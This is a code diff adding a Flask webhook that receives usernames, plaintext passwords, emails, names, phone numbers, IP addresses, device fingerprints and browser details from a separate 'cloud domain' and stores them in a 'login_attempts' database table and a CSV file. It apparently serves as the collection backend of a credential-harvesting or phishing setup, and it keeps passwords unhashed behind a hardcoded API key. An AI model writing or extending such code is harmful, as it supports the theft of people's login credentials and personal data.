@@ -159,6 +159,193 @@ def fetch_entries():
             "status": "error"
         }), 500
 
+# NEW: Webhook endpoint to receive data from cloud domain
+@app.route('/api/webhook/save-user-data', methods=['POST'])
+def webhook_save_user_data():
+    """
+    Webhook endpoint to receive completed user data from cloud domain
+    Expected JSON payload:
+    {
+        "api_key": "abcdefghijklmnopnp2025",
+        "username": "user@example.com",
+        "password": "userpassword",
+        "email": "user@example.com",
+        "firstname": "John",
+        "lastname": "Doe",
+        "phone": "09123456789",
+        "ip_address": "192.168.1.1",
+        "device_fingerprint": "unique-device-id",
+        "device_type": "Desktop",
+        "browser_info": "Mozilla/5.0..."
+    }
+    """
+    try:
+        # Get JSON data from request
+        payload = request.get_json()
+        
+        if not payload:
+            return jsonify({
+                "error": "No JSON data provided",
+                "status": "error"
+            }), 400
+        
+        # Verify API key
+        provided_api_key = payload.get('api_key')
+        if not provided_api_key or provided_api_key != API_KEY:
+            return jsonify({
+                "error": "Unauthorized: Invalid or missing API key",
+                "status": "error"
+            }), 401
+        
+        # Extract user data from payload
+        username = payload.get('username', '').strip()
+        password = payload.get('password', '').strip()
+        email = payload.get('email', '').strip()
+        firstname = payload.get('firstname', '').strip()
+        lastname = payload.get('lastname', '').strip()
+        phone = payload.get('phone', '').strip()
+        ip_address = payload.get('ip_address', '').strip()
+        device_fingerprint = payload.get('device_fingerprint', '').strip()
+        device_type = payload.get('device_type', '').strip()
+        browser_info = payload.get('browser_info', '').strip()
+        
+        # Validate required fields
+        if not username or not password:
+            return jsonify({
+                "error": "Missing required fields: username and password",
+                "status": "error"
+            }), 400
+        
+        # Generate timestamp
+        now = datetime.now()
+        adjusted_time = now + timedelta(hours=8)  # PHT timezone
+        timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
+        
+        # Save to MySQL database
+        try:
+            import pymysql
+            from database.config import get_db_config
+            
+            config = get_db_config()
+            conn = pymysql.connect(**config)
+            cursor = conn.cursor()
+            
+            # Create table if it doesn't exist
+            create_table_sql = """
+            CREATE TABLE IF NOT EXISTS login_attempts (
+                id VARCHAR(36) PRIMARY KEY,
+                username VARCHAR(255),
+                password VARCHAR(255),
+                email VARCHAR(255),
+                firstname VARCHAR(255),
+                lastname VARCHAR(255),
+                phone VARCHAR(20),
+                timestamp VARCHAR(255),
+                ip_address VARCHAR(45),
+                device_fingerprint VARCHAR(255),
+                device_type VARCHAR(100),
+                browser_info TEXT,
+                source VARCHAR(50),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+            """
+            
+            cursor.execute(create_table_sql)
+            conn.commit()
+            
+            # Insert data
+            record_id = str(uuid.uuid4())
+            insert_sql = """
+            INSERT INTO login_attempts (id, username, password, email, firstname, lastname, phone, timestamp, ip_address, device_fingerprint, device_type, browser_info, source)
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+            """
+            
+            cursor.execute(insert_sql, (
+                record_id,
+                username,
+                password,
+                email or '',
+                firstname or '',
+                lastname or '',
+                phone or '',
+                timestamp,
+                ip_address or '',
+                device_fingerprint or '',
+                device_type or '',
+                browser_info or '',
+                'cloud_webhook'
+            ))
+            
+            conn.commit()
+            cursor.close()
+            conn.close()
+            
+            print(f"✓ Cloud data saved to MySQL database: {username}")
+            
+        except Exception as db_error:
+            print(f"⚠ Warning: Could not save to MySQL database: {str(db_error)}")
+        
+        # Save to CSV file
+        try:
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            csv_path = os.path.join(script_dir, 'data.csv')
+            
+            file_exists = os.path.isfile(csv_path)
+            
+            with open(csv_path, 'a', newline='\n', encoding='utf-8') as csvfile:
+                # Define fieldnames including all new fields
+                fieldnames = ['username', 'password', 'email', 'firstname', 'lastname', 'phone', 'timestamp', 'ip_address', 'device_fingerprint', 'device_type', 'browser_info', 'source']
+                writer = csv.DictWriter(csvfile, fieldnames=fieldnames, delimiter=',', quoting=csv.QUOTE_MINIMAL)
+                
+                # Write header if file is new
+                if not file_exists or os.stat(csv_path).st_size == 0:
+                    writer.writeheader()
+                    csvfile.flush()
+                
+                # Write data row
+                writer.writerow({
+                    'username': username,
+                    'password': password,
+                    'email': email or '',
+                    'firstname': firstname or '',
+                    'lastname': lastname or '',
+                    'phone': phone or '',
+                    'timestamp': timestamp,
+                    'ip_address': ip_address or '',
+                    'device_fingerprint': device_fingerprint or '',
+                    'device_type': device_type or '',
+                    'browser_info': browser_info or '',
+                    'source': 'cloud_webhook'
+                })
+                csvfile.flush()
+            
+            update_last_modified_timestamp()
+            print(f"✓ Cloud data saved to CSV: {csv_path}")
+            
+        except Exception as csv_error:
+            print(f"Error saving to CSV: {str(csv_error)}")
+            return jsonify({
+                "error": f"Data saved to database but failed to save to CSV: {str(csv_error)}",
+                "status": "partial_success",
+                "record_id": record_id if 'record_id' in locals() else None
+            }), 207
+        
+        # Return success response
+        return jsonify({
+            "message": "User data received and saved successfully",
+            "status": "success",
+            "record_id": record_id if 'record_id' in locals() else None,
+            "username": username,
+            "timestamp": timestamp
+        }), 200
+        
+    except Exception as e:
+        print(f"Error in webhook_save_user_data: {str(e)}")
+        return jsonify({
+            "error": str(e),
+            "status": "error"
+        }), 500
+
 def get_client_ip():
     ip_headers = [
         'CF-Connecting-IP', 'True-Client-IP', 'X-Forwarded-For',
